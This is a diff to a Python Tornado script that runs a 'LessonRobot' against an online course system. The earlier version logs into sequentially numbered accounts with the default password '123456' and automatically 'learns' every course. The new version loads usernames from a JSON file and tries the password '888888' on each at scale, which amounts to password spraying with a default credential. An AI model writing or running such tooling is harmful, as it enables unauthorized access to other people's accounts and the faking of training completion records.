@@ -1,16 +1,17 @@
 import signal
 import logging
 import time
+import json
 from tornado.gen import coroutine, sleep
 from tornado.ioloop import IOLoop
 from tornado.queues import Queue
 from tornado.httpclient import AsyncHTTPClient
 from lessonrobot import LessonRobot
 
-concurrency = 500
+concurrency = 10
 q = Queue()
 
-logging.basicConfig(format="%(asctime)s: %(message)s", level=logging.INFO, filename='shaoxing.log')
+logging.basicConfig(format="%(asctime)s: %(message)s", level=logging.INFO, filename='hunan.log')
 AsyncHTTPClient.configure(None, max_clients=1000)
 
 spawn_timestamp = time.time()
@@ -25,29 +26,15 @@ def worker():
 
 		try:
 			robot = LessonRobot()
-			result = yield robot.login(username, '123456')
-			if result:
-				logging.info('[Login] %s' % username)
-				count = yield robot.page_count()
-				for i in xrange(count + 1):
-					course_list = yield robot.page(i)
-					course_len = len(course_list)
-					logging.info('[Page] %s: %d/%d => %d' % (username, i, count, course_len))
-					if course_len == 0 and i != 0:
-						raise Exception('Session Expired')
-					for course in course_list:
-						logging.info('[Learn] %s: %s' % (username, course))
-						yield robot.learn(course)
+			result = yield robot.login(username, '888888')
+			logging.info('[Done] %s:%s' % (username, result))
 
-						now_timestamp = time.time()
-						if now_timestamp - exception_timestamp > 60 and now_timestamp - spawn_timestamp > 60:
-							concurrency += 1
-							IOLoop.current().spawn_callback(worker)
-							spawn_timestamp = now_timestamp
-							logging.info('[Spawn] concurrency = %d' % concurrency)
-				logging.info('[Done] %s' % username)
-			else:
-				logging.info('[Failed] %s' % username)
+			now_timestamp = time.time()
+			if now_timestamp - exception_timestamp > 60 and now_timestamp - spawn_timestamp > 60:
+				concurrency += 1
+				IOLoop.current().spawn_callback(worker)
+				spawn_timestamp = now_timestamp
+				logging.info('[Spawn] concurrency = %d' % concurrency)
 		except Exception as e:
 			logging.info('[Exception] %s:%s' % (username, e))
 			yield q.put(username)
@@ -67,11 +54,13 @@ def worker():
 
 @coroutine
 def spawner():
-	for i in xrange(200000, 201000):
-		username = 'sxce%06d' % i
+	accounts = []
+	with open('accounts.json') as accounts_file:
+		accounts = json.loads(accounts_file.read())
+	for username in accounts:
 		yield q.put(username)
 		logging.info('[Put] %s' % username)
-		yield sleep(1)
+		yield sleep(0.1)
 
 def handler_USR1(signum, frame):
 	global concurrency
